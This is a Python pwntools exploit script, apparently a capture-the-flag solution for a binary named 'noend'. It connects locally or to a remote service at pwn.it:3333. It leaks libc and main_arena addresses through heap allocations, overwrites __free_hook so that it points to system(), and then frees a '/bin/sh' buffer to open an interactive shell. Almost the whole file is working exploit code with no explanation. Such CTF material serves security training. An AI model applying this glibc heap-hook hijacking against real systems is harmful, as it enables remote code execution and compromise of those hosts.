#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./noend"
elf=ELF(pwn_file)
os.environ["LD_LIBRARY_PATH"]="/dbg64/lib"
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("/dbg64/lib/libc.so.6")
arena_address=0

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("libc address:0x%x"%libc.address)
    log.debug("arena address:0x%x"%arena_address)
    pause()

def add(size,content=None):
    conn.send(str(size))
    if content:
        conn.send(content)
        data=conn.recv()
    else:
        data=None
    return data

add(0x28,"a"*8)
add(0x38,"a"*8)
add(0x7f,"a"*8)
data=add(0x20,"a"*8)
#libc.address=u64(data[8:16])-0x3c4b78
libc.address=u64(data[8:16])-libc.sym["main_arena"]-0x58
add(libc.sym["__malloc_hook"]+1)
add(0x28,"a"*8)
add(0x38,"a"*8)
add(0x7f,"a"*8)
data=add(0x80,"a"*8)
arena_address=u64(data[8:16])-0x78

add(0x30,"a")
add(0x180,p64(libc.sym["__free_hook"]-(arena_address+0xb00)+libc.sym["system"]-8)*(0x180/8))
add(arena_address+0x79)
add(libc.sym["__free_hook"]-(arena_address+0xb00)-0x18,"a")

add(0x30,"/bin/sh\x00")

conn.interactive()
